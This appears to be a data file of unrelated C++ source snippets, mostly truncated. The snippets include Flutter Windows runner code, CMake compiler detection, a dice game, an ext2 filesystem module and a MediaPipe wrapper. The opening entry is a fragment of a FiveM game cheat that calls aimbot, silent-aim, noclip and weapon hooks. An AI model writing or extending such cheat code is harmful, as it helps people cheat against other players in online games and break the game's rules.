(!Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\r\n\t\t}\r\n\t\tif (Settings::Aimbot::silentaim && Settings::Aimbot::aimmousewhilesilent)\r\n\t\t{\r\n\t\t\tAimbot::Hook();\r\n\t\t}\r\n\t\tif (Settings::Aimbot::Aimbot && Settings::Aimbot::silentaim)\r\n\t\t{\r\n\t\t//\tAimbot::aimbot_silent();\r\n\r\n\t\t}\r\n\r\n\t\tWeapon::Hook();\r\n\t\tNoClip::Hook();\r\n\t\tVehicule::Hook();\r\n\r\n\t\tif (Settings::Aimbot::Draw_Fov)\r\n\t\t{\r\n\r\n\t\t\t//\tImGui::GetBackgroundDrawList()->AddCircle(ImVec2(1920 / 2, 1080 / 2), Option::AimbotFov, IM_COL32(255, 255, 255, 255), 40.f,1.f);\r\n\t\t\tImGui::GetBackgroundDrawList()->AddCircleFilled(ImVec2(FiveM::WindowSize.x / 2, FiveM::WindowSize.y / 2), Settings::Aimbot::AimbotFov, IM_COL32(0, 0, 0, 140), 40.F);\r\n\t\t}\r\n\r\n\t\tif (Settings::Aimbot::crosshair)\r\n\t\t{\r\n\t\t\tImGui::GetBackgroundDrawList()->AddLine(ImVec2(955, 540), ImVec2(965, 540), ImColor(255, 255, 255, 255), 1);\r\n\t\t\tImGui::GetBackgroundDrawList()-",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"favourite_app_using_provider\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <iostream>\n#include <limits>\n#include <random>\n#include <stdexcept>\nusing namespace std;\n\nclass DiceGame {\npublic:\n    DiceGame() : pointsTotal(500), playerWon(false) {}\n\n    void playGame() {\n        string playerName = getPlayerName();\n        do {\n            placeBet();\n            rollDice();\n            calculatePoints();\n            displayPoints();\n            checkGameStatus();\n        } while (playerWantsToContinue());\n    }\n\nprivate:\n    int pointsTotal;\n    int bet;\n    int dice[2];\n    bool playerWon;\n\n    static string getPlayerName() {\n        cout << \"Welcome to the Dice Game! Please enter your name: \";\n        string name;\n        cin >> name;\n        return name;\n    }\n\n    void placeBet() {\n        cout << \"You have \" << pointsTotal << \" points.\" << endl;\n        cout << \"Place your bet: \";\n        while (!(cin >> bet) || bet <= 0 || bet > pointsTotal) {\n            cout << \"Invalid bet. Please enter a value between 1 and \" << pointsTotal << \": \";\n            cin.clear();\n            cin.ignore(numeric_limits<streamsize>::max(), '\\n');\n        }\n    }\n\n    void rollDice() {\n        random_device rd;\n        mt19937 gen(rd());\n        uniform_int_distribution<> distrib(1, 6);\n        dice[0] = distrib(gen);\n        dice[1] = distrib(gen);\n        cout << \"Rolled: \" << dice[0] << \" and \" << dice[1] << endl;\n    }\n\n    void calculatePoints() {\n        int sum = dice[0] + dice[1];\n        if (dice[0] == 4 && dice[1] == 4) {\n            pointsTotal += bet + 200;\n        } else if (sum == 7 || sum == 11) {\n            pointsTotal += bet + 100;\n        } else {\n            pointsTotal -= (25 + bet);\n        }\n    }\n\n    void displayPoints() const {\n        if (pointsTotal > 0) {\n            cout << \"Current points: \" << pointsTotal << endl;\n        } else {\n            cout << \"You've run out of points!\" << endl;\n        }\n    }\n\n    void checkGameStatus() {\n        if (pointsTotal >= 1000) {\n            cout << \"Congratulations! You've won the game with \" << pointsTotal << \" points!\" << endl;\n            playerWon = true;\n        } else if (pointsTotal <= 0) {\n            cout << \"Sorry, you've lost all your points. Better luck next time!\" << endl;\n            playerWon = false;\n        }\n    }\n\n    bool playerWantsToContinue() {\n        if (playerWon || pointsTotal <= 0) {\n            char choice;\n            cout << \"Would you like to play again? (Y/N): \";\n            cin >> choice;\n            if (choice == 'Y' || choice == 'y') {\n                pointsTotal = 500; // Reset points for a new game\n                return true;\n            }\n            return false;\n        }\n        cout << \"Continue playing? (Y/N): \";\n        char choice;\n        cin >> choice;\n        return choice == 'Y' || choice == 'y';\n    }\n};\n\nint main() {\n    try {\n        DiceGame game;\n        game.playGame();\n    } catch (const exception& e) {\n        cerr << \"An error occurred: \" << e.what() << endl;\n    }\n    cout << \"Goodbye! Have a nice day!\" << endl;\n    return 0;\n}",
    "#include \"../../headers/blockGroups.h\"\n\n\nSuperblock global_sb;\nBGDT global_bgdt;\n\n\nuint32_t roundUp(uint32_t numToRound, uint32_t multiple)\n{\n\treturn numToRound = (numToRound + multiple - 1) & ~(multiple - 1);\n}\n\nSuperblock createSuperblock()\n{\n\tSuperblock sb;\n\t// init new superblock with default values\n\tmemset(&sb, 0, sizeof(Superblock));\n\tsb.ext2Sign = EXT_MAGIC;\n\tsb.sbContainerBlock = 1;\n\tsb.inodesInBg = 8192;\n\tsb.blocksInBg = 8192;\n\tsb.totalFreeBlocks = 8192;\n\tsb.totalFreeInodes = 8192;\n\tsb.sbContainerBlock = 1;\n\tsb.blockSize = 0; // block size of 1024 bytes\n\tsb.state = CLEAN;\n\tsb.errorHandle = PANIC;\n\n\tsb.totalBlocks = DISK_SIZE / (BLOCK_SIZE);// 51200 // TODO: calculate the actual size of the disk\n\tsb.totalInodes = (sb.inodesInBg * sb.totalBlocks) / sb.blocksInBg;\n\t\n\n\twrite_serial(\"created superblock\");\n\n\treturn sb;\n}\n\nBGDT createBGDT()\n{\n\n\tBGDT bgdt;\n\tunsigned int groupCount = (int)(1 + (global_sb.totalBlocks-1) / global_sb.blocksInBg);\n\tunsigned int descriptionListSize = groupCount * sizeof(BGD); // in bytes\n\tdescriptionListSize = roundUp(descriptionListSize, BLOCK_SIZE); // round up to the nearest 1024 bytes\n\tbgdt.groupDescriptors = (BGD*)kernelPaging.getAllocator()->calloc(descriptionListSize); // buffer that will be written to the disk\n\n\n\tuint32_t groupSize = (global_sb.blocksInBg * BLOCK_SIZE); // 1024 * 8192 bytes\n\t// calculate inode table size (because it is a list with variable size)\n\tuint32_t inodeTableListSize = getInodeTableSize(global_sb);\n\n\t// \t                 superblockAddr + sizeofSuperblock + group descriptors size\n\tuint32_t group0_Offset = 1 + 1 + (descriptionListSize / BLOCK_SIZE);\n\n\n\tfor (unsigned int groupNum = 0; groupNum < groupCount; groupNum++)\n\t{\t\n\t\t// calculate the addresses of the header blocks\n\t\tuint32_t dataBlockBitmapOffset = group0_Offset + (groupNum * groupSize / BLOCK_SIZE);\n\t\tuint32_t inodeBitmapOffset = dataBlockBitmapOffset + 1;\n\t\tuint32_t inodeTableOffset = inodeBitmapOffset + 1;\n\n\t\t//                       blocksInGroup - InodeBitmap - DataBlockBitmap - InodeTable\n\t\tuint32_t blocksInData = global_sb.blocksInBg - 2 - getInodeTableSize(global_sb);\n\n\n\t\t// create block group descriptor for this group\n\t\tBGD bgd;\n\t\tbgd.blockUsageBitmap = dataBlockBitmapOffset;\n\t\tbgd.inodeUsageBitmap = inodeBitmapOffset;\n\t\tbgd.inodeTable = inodeTableOffset;\n\t\tbgd.freeBlocks = blocksInData; // amount of blocks in the data blocks\n\t\tbgd.freeInodes = global_sb.inodesInBg;\n\t\tbgd.totalDirs = 0;\n\t\tbgdt.groupDescriptors[groupNum] = bgd;\n\t}\n\n\treturn bgdt;\n}\n\nSuperblock getSuperblock()\n{\n\t\n\t// read the superblock from the disk\n\tdisk.read(SB_POSITION, sizeof(Superblock), (uint8_t*)&global_sb);\n\treturn global_sb;\n}\n\nBlockGroup getBlockGroup(unsigned int blockGroupIdx)\n{\n\tBlockGroup bg;\n\n\tBGD bgd = getBGD(blockGroupIdx);\n\tbg.dataBlockBitmap = (uint8_t*)BLOCK_OFFSET(bgd.blockUsageBitmap);\n\tbg.inodeBitmap = (uint8_t*)BLOCK_OFFSET(bgd.inodeUsageBitmap);\n\tbg.inodeTable = (Inode*)BLOCK_OFFSET(bgd.inodeTable);\n\n\tbg.bgd = (BGD*)((blockGroupIdx * sizeof(BGD)) + (SB_POSITION + BLOCK_SIZE));\n\tbg.data = (uint8_t*)((uint32_t)bg.inodeTable + getInodeTableSize(global_sb));\n\n\treturn bg;\n}\n\nBGD getBGD(unsigned int blockGroupIdx)\n{\n\tBGD bgd;\n\tuint32_t groupDescriptorsAddr = SB_POSITION + BLOCK_SIZE;\n\n\t// read the block group descriptor from the disk\n\tdisk.read(groupDescriptorsAddr + (blockGroupIdx * sizeof(BGD)), sizeof(BGD), (uint8_t*)&bgd);\n\treturn bgd;\n}\n\nuint8_t* getBlockBitmap(BGD bgd)\n{\n\tuint8_t* blockBitmap = (uint8_t*)kernelPaging.getAllocator()->calloc(BLOCK_SIZE);\n\tdisk.read(BLOCK_OFFSET(bgd.blockUsageBitmap), BLOCK_SIZE, blockBitmap);\n\treturn blockBitmap;\n}\n\nuint8_t* getInodeBitmap(BGD bgd)\n{\n\tuint8_t* inodeBitmap = (uint8_t*)kernelPaging.getAllocator()->calloc(BLOCK_SIZE);\n\tdisk.read(BLOCK_OFFSET(bgd.inodeUsageBitmap), BLOCK_SIZE, inodeBitmap);\n\treturn inodeBitmap;\n}\n\nInodeTable getInodeTable(BGD bgd)\n{\n\tInodeTable it;\n\tit.inodes = (Inode*)kernelPaging.getAllocator()->calloc(getInodeTableSize(global_sb));\n\tdisk.read(BLOCK_OFFSET(bgd.inodeTable), getInodeTableSize(global_sb), (uint8_t*)it.inodes);\n\treturn it;\n}\n\nvoid setBGD(unsigned int blockGroupIdx, BGD bgd)\n{\n\t// calculate the addresses of the header blocks\n\tuint32_t groupDescriptorsAddr = SB_POSITION + BLOCK_SIZE;\n\n\t// write the block group descriptor to the disk\n\tdisk.write(groupDescriptorsAddr + (blockGroupIdx * sizeof(BGD)), sizeof(BGD), (uint8_t*)&bgd);\n}\n\nvoid setSuperblock(Superblock sb)\n{\n\t// write the superblock to the disk\n\tdisk.write(SB_POSITION, sizeof(Superblock), (uint8_t*)&sb);\n\t// disk.write(SB_POSITION, 300, (uint8_t*)&sb);\n}\n\nvoid setBGDT(BGDT bgdt)\n{\n\tunsigned int groupCount = (int)(1 + (global_sb.totalBlocks-1) / global_sb.blocksInBg);\n\tunsigned int descriptionListSize = groupCount * sizeof(BGD); // in bytes\n\t// descriptionListSize = roundUp(descriptionListSize, BLOCK_SIZE); // round up to the nearest 1024 bytes\n\t// write the block group descriptor table to the disk\n\tdisk.write(SB_POSITION + BLOCK_SIZE, descriptionListSize, (uint8_",
    "#include \"mediapipe.h\"\n\n#include \"mediapipe/framework/calculator_framework.h\"\n#include \"mediapipe/framework/port/parse_text_proto.h\"\n#include \"mediapipe/framework/formats/image_frame.h\"\n#include \"mediapipe/framework/formats/landmark.pb.h\"\n#include \"mediapipe/framework/formats/rect.pb.h\"\n#include \"mediapipe/framework/tool/options_util.h\"\n\n#include \"mediapipe/calculators/util/thresholding_calculator.pb.h\"\n#include \"mediapipe/calculators/tensor/tensors_to_detections_calculator.pb.h\"\n\n#ifdef __ANDROID__\n#include \"mediapipe/util/android/asset_manager_util.h\"\n#include \"mediapipe/framework/port/singleton.h\"\n#endif\n\n#include \"absl/flags/declare.h\"\n#include \"absl/flags/flag.h\"\n#include \"google/protobuf/util/json_util.h\"\n\n#include <string>\n#include <cstring>\n#include <variant>\n#include <cassert>\n#include <fstream>\n#include <iostream>\n\n#ifndef __ANDROID__\nABSL_DECLARE_FLAG(std::string, resource_root_dir);\n#endif\n\nthread_local absl::Status last_error;\n\nstruct mp_node_option\n{\n    const char *node;\n    const char *option;\n    std::variant<float, double> value;\n};\n\nstruct mp_instance_builder\n{\n    const char *graph_filename;\n    const char *input_stream;\n    std::vector<mp_node_option> options;\n    std::map<std::string, mediapipe::Packet> side_packets;\n};\n\nstruct mp_instance\n{\n    mediapipe::CalculatorGraph graph;\n    std::string input_stream;\n    size_t frame_timestamp;\n};\n\nstruct mp_poller\n{\n    mediapipe::OutputStreamPoller poller;\n};\n\nstruct mp_packet\n{\n    mediapipe::Packet packet;\n};\n\ntemplate <typename List, typename Landmark>\nstatic mp_multi_face_landmark_list *get_multi_face_landmarks(mp_packet *packet)\n{\n    const auto &mp_data = packet->packet.template Get<std::vector<List>>();\n\n    auto *lists = new mp_landmark_list[mp_data.size()];\n\n    for (int i = 0; i < mp_data.size(); i++)\n    {\n        const List &mp_list = mp_data[i];\n        auto *list = new mp_landmark[mp_list.landmark_size()];\n\n        for (int j = 0; j < mp_list.landmark_size(); j++)\n        {\n            const Landmark &mp_landmark = mp_list.landmark(j);\n            list[j] = {\n                mp_landmark.x(),\n                mp_landmark.y(),\n                mp_landmark.z()};\n        }\n\n        lists[i] = mp_landmark_list{\n            list,\n            (int)mp_list.landmark_size()};\n    }\n\n    return new mp_multi_face_landmark_list{\n        lists,\n        (int)mp_data.size()};\n}\n\ntemplate <typename Rect>\nstatic mp_rect_list *get_rects(mp_packet *packet)\n{\n    const auto &mp_data = packet->packet.template Get<std::vector<Rect>>();\n    auto *list = new mp_rect[mp_data.size()];\n\n    for (int i = 0; i < mp_data.size(); i++)\n    {\n        const Rect &mp_rect = mp_data[i];\n        list[i] = {\n            (float)mp_rect.x_center(),\n            (float)mp_rect.y_center(),\n            (float)mp_rect.width(),\n            (float)mp_rect.height(),\n            mp_rect.rotation(),\n            mp_rect.rect_id()};\n    }\n\n    return new mp_rect_list{\n        list,\n        (int)mp_data.size()};\n}\n\nextern \"C\"\n{\n\n    MEDIAPIPE_API mp_instance_builder *mp_create_instance_builder(const char *graph_filename, const char *input_stream)\n    {\n        return new mp_instance_builder{graph_filename, input_stream, {}};\n    }\n\n    MEDIAPIPE_API void mp_add_option_float(mp_instance_builder *instance_builder, const char *node, const char *option, float value)\n    {\n        instance_builder->options.push_back({node, option, value});\n    }\n\n    MEDIAPIPE_API void mp_add_option_double(mp_instance_builder *instance_builder, const char *node, const char *option, double value)\n    {\n        instance_builder->options.push_back({node, option, value});\n    }\n\n    MEDIAPIPE_API void mp_add_side_packet(mp_instance_builder *instance_builder, const char *name, mp_packet *packet)\n    {\n        instance_builder->side_packets.insert({name, packet->packet});\n        mp_destroy_packet(packet);\n    }\n\n    MEDIAPIPE_API mp_instance *mp_create_instance(mp_instance_builder *builder)\n    {\n        mediapipe::CalculatorGraphConfig config;\n\n        std::ifstream stream(builder->graph_filename, std::ios::binary | std::ios::ate);\n        if (!stream)\n        {\n            // Convert 'builder->graph_filename' to std::string before concatenation\n            std::string error_message = \"Failed to open graph file at path: \" + std::string(builder->graph_filename);\n            last_error = absl::Status(absl::StatusCode::kNotFound, error_message);\n            return nullptr;\n        }\n\n        size_t size = stream.tellg();\n        stream.seekg(0, std::ios::beg);\n\n        char *memory = new char[size];\n        stream.read(memory, size);\n        config.ParseFromArray(memory, size);\n        delete[] memory;\n\n        mediapipe::ValidatedGraphConfig validated_config;\n        validated_config.Initialize(config);\n        mediapipe::CalculatorGraphConfig canonical_config = validated_config.Config();\n\n        for (const mp_node_option &option : builder->options)\n        {\n            for (auto &node : *canonical_config.mut",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, 